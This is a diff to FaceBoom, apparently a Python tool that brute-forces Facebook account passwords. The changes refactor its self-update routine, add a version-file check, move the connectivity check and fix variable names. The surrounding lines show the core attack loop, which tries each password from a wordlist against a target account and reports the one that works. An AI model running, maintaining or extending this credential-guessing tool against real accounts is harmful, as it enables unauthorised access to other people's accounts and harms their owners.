@@ -14,6 +14,7 @@ os.system("cls||clear")
 def write(text):
     sys.stdout.write(text)
     sys.stdout.flush()
+versionPath = "core"+os.sep+"version.txt"
 
 errMsg = lambda msg: write(rd+"\n["+yl+"!"+rd+"] Error: "+yl+msg+rd+ " !!!\n"+wi)
 
@@ -121,20 +122,23 @@ class FaceBoom(object):
 
     @staticmethod
     def updateFaceBoom():
+        if not os.path.isfile(versionPath):
+             errMsg("Unable to check for updates: please re-clone the script to fix this problem")
+             sys.exit(1)
         write("[~] Checking for updates...\n")
         conn = httplib.HTTPSConnection("raw.githubusercontent.com")
         conn.request("GET", "/Oseid/FaceBoom/master/core/version.txt")
         repoVersion = conn.getresponse().read().strip().decode()
-        with open("core"+os.sep+"version.txt") as vf:
+        with open(versionPath) as vf:
             currentVersion = vf.read().strip()
         if repoVersion == currentVersion:write("  [*] The script is up to date!\n")
         else:
                 print("  [+] An update has been found ::: Updating... ")
                 conn.request("GET", "/Oseid/FaceBoom/master/faceboom.py")
                 newCode = conn.getresponse().read().strip().decode()
-                with open("faceboom.py", "w") as  faceboomScript:
-                   faceboomScript.write(newCode)
-                with open("core"+os.sep+"version.txt", "w") as ver:
+                with open("faceboom.py", "w") as  faceBoomScript:
+                   faceBoomScript.write(newCode)
+                with open(versionPath, "w") as ver:
                      ver.write(repoVersion)
                 write("  [+] Successfully updated :)\n")
 
@@ -185,9 +189,6 @@ def Main():
                         help="Specify TARGET FACEBOOK PROFILE URL to get his ID")
    parse.add_option("-u","-U","--update","--UPDATE", dest="update", action="store_true", default=False)
    (options,args) = parse.parse_args()
-   if not FaceBoom.cnet():
-       errMsg("Please Check Your Internet Connection")
-       sys.exit(1)
    faceboom = FaceBoom()
    target = options.target
    wordlist = options.wordlist
@@ -195,6 +196,12 @@ def Main():
    proxy = options.proxy
    target_profile = options.url
    update = options.update
+   opts = [target,wordlist,single_passwd, proxy, target_profile, update]
+   if not any(opt for opt in opts):pass
+   else:
+     if not faceboom.cnet():
+       errMsg("Please Check Your Internet Connection")
+       sys.exit(1)
    if update:
     faceboom.updateFaceBoom()
     sys.exit(1)
@@ -226,13 +233,13 @@ def Main():
                 errMsg("Unable to connect to Proxy["+rd+str(proxy)+yl+"]")
                 sys.exit(1)
 
-        faceBoom.banner(target,wordlist,single_passwd)
+        faceboom.banner(target,wordlist,single_passwd)
         loop,passwords = (1,open(wordlist).readlines()) if not single_passwd else ("~",[single_passwd])
         for passwd in passwords:
                 passwd = passwd.strip()
                 if len(passwd) <6:continue
                 write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
-                if faceBoom.login(target, passwd):
+                if faceboom.login(target, passwd):
                     sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
                     print(wi+"========================="+"="*len(passwd)+"======")
                     print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
